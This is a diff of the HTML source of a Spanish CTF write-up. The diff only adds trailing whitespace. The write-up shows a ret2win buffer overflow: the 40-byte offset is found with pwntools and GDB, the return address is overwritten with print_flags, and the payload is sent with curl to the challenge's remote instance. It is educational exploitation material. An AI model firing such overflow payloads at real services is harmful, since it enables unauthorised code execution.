@@ -129,24 +129,24 @@ $
 RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
 Stack:    <span class=code-dark-red>No canary found</span>
 NX:       <span class=code-dark-red>NX disabled</span>
-PIE:      <span class=code-dark-red>No PIE (0x400000)</span>
+PIE:      <span class=code-dark-red>No PIE (0x400000)</span>  
 RWX:      <span class=code-dark-red>Has RWX segments</span>
 </code></pre></div>
 <p>Si ejecutamos el binario, parece que no hace nada:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./vulnerable</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./vulnerable</span>  
 asdf
 fdsa
 1
 2
 </code></pre></div>
 <p>Si insertamos datos desde la entrada estándar (<code>stdin</code>), vemos que el programa funciona:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> asdf | <span class=code-dark-green>./vulnerable</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> asdf | <span class=code-dark-green>./vulnerable</span>  
 Hello asdf
 !
 </code></pre></div>
 <p>Vamos a enviar 100 caracteres utilizando Python para ver si falla:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./vulnerable</span> <<< <span class=code-dark-magenta>$(</span><span class=code-dark-green>python3</span> -c <span class=code-dark-yellow>'print("A" * 100)'</span><span class=code-dark-magenta>)</span>
-Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
 !
 zsh: segmentation fault (core dumped)
 </code></pre></div>
@@ -197,7 +197,7 @@ zsh: segmentation fault (core dumped)
 <p>Esta vez nos centraremos en controlar <code>$rip</code>, que es el registro <em>Instruction Pointer</em>. Como su propio nombre indica, contiene la dirección de la siguiente instrucción a ejecutar. Por consiguiente, si sobreescribimos <code>$rip</code> con la dirección de <code>print_flags</code>, esta función se ejecutará.</p>
 <p>La dirección de la función se puede ver en Ghidra (<code>0x4006ee</code>). Aunque también se puede obtener mediante <code>readelf</code>:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s vulnerable | <span class=code-dark-green>grep</span> print_flags
-    59: 00000000004006ee    34 FUNC    GLOBAL DEFAULT   13 <span class=code-red>print_flags</span>
+    59: 00000000004006ee    34 FUNC    GLOBAL DEFAULT   13 <span class=code-red>print_flags</span>  
 </code></pre></div>
 <p>Ahora necesitamos saber cuántos caracteres hay que introducir hasta llegar al registro <code>$rip</code>, y poder poner la dirección de <code>print_flags</code>. Esto se puede realizar mediante GDB y un patrón creado con <code>cyclic</code> de <code>pwntools</code> (por ejemplo, de 100 caracteres):</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>pwn</span> cyclic 100 | <span class=code-dark-green>tee</span> pattern
@@ -208,28 +208,28 @@ Reading symbols from <span class=code-dark-green>vulnerable</span>...
 (No debugging symbols found in <span class=code-dark-green>vulnerable</span>)
 <span class=code-red>gef➤</span>  run < pattern
 Starting program: ./vulnerable < pattern
-Hello aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa!
+Hello aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa!  
 
 Program received signal SIGSEGV, Segmentation fault.
 <span class=code-dark-blue>0x0000000000400771</span> in <span class=code-dark-yellow>main</span> ()
 </code></pre></div>
 <p>Ahora que el programa ha fallado, podemos examinar los valores de los registros. Como se trata de un binario de 64 bits, <code>$rip</code> no se sobreescribe (se podría decir que está protegido), por lo que tenemos que tomar el valor de <code>$rsp</code> (que es el siguiente registro después de <code>$rip</code>):</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  x $rsp
-<span class=code-dark-blue>0x7fffffffe758</span>: 0x6161616b
+<span class=code-dark-blue>0x7fffffffe758</span>: 0x6161616b  
 </code></pre></div>
 <p>El valor <code>0x6161616b</code> se corresponde con <code>kaaa</code> (en formato <em>little-endian</em>). Podemos calcular el <em>offset</em> de nuevo con <code>pwntools</code>:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>pwn</span> cyclic -l 0x6161616b
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>pwn</span> cyclic -l 0x6161616b  
 40
 </code></pre></div>
 <p>Por tanto, necesitamos introducir 40 caracteres y después la dirección de <code>print_flags</code> para redirigir la ejecución del programa. Vamos a hacerlo desde la línea de comandos. Para evitar comportamientos inesperados, vamos a poner una variable de entorno llamada <code>FLAGS</code> (ya que el binario la comprueba durante la función <code>print_flags</code>):</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-yellow>export</span> FLAGS=this_will_be_the_flag
 
-<span class=code-cyan>$</span> <span class=code-dark-yellow>(</span><span class=code-dark-green>python3</span> -c <span class=code-dark-yellow>'import sys; sys.stdout.write("A" * 40)'</span>; <span class=code-dark-green>echo</span> -e <span class=code-dark-yellow>'\xee\x06\x40\0\0\0\0\0')</span> | <span class=code-dark-green>./vulnerable</span>
+<span class=code-cyan>$</span> <span class=code-dark-yellow>(</span><span class=code-dark-green>python3</span> -c <span class=code-dark-yellow>'import sys; sys.stdout.write("A" * 40)'</span>; <span class=code-dark-green>echo</span> -e <span class=code-dark-yellow>'\xee\x06\x40\0\0\0\0\0')</span> | <span class=code-dark-green>./vulnerable</span>  
 Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@!
 this_will_be_the_flag
 </code></pre></div>
 <p>Perfecto, ahora tenemos que enviar lo mismo a la instancia remota. Como los datos se toman desde un parámetro de URL, necesitamos codificar los caracteres hexadecimales a codificación URL:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-yellow>"http://35.227.24.107/0f7bd59245/?stdin=</span><span class=code-dark-magenta>$(</span><span class=code-dark-green>python3</span> -c <span class=code-dark-yellow>'import sys; sys.stdout.write("A" * 40)'</span><span class=code-dark-magenta>)</span><span class=code-dark-yellow>%ee%06%40%00%00%00%00%00"</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-yellow>"http://35.227.24.107/0f7bd59245/?stdin=</span><span class=code-dark-magenta>$(</span><span class=code-dark-green>python3</span> -c <span class=code-dark-yellow>'import sys; sys.stdout.write("A" * 40)'</span><span class=code-dark-magenta>)</span><span class=code-dark-yellow>%ee%06%40%00%00%00%00%00"</span>  
 
                 &lt;a href="vulnerable"&gt;Download binary&lt;/a&gt;&lt;br&gt;&lt;br&gt;
                 &lt;form&gt;Stdin: &lt;input type="text" name="stdin"&gt; &lt;input type="submit"&gt;&lt;/form&gt;
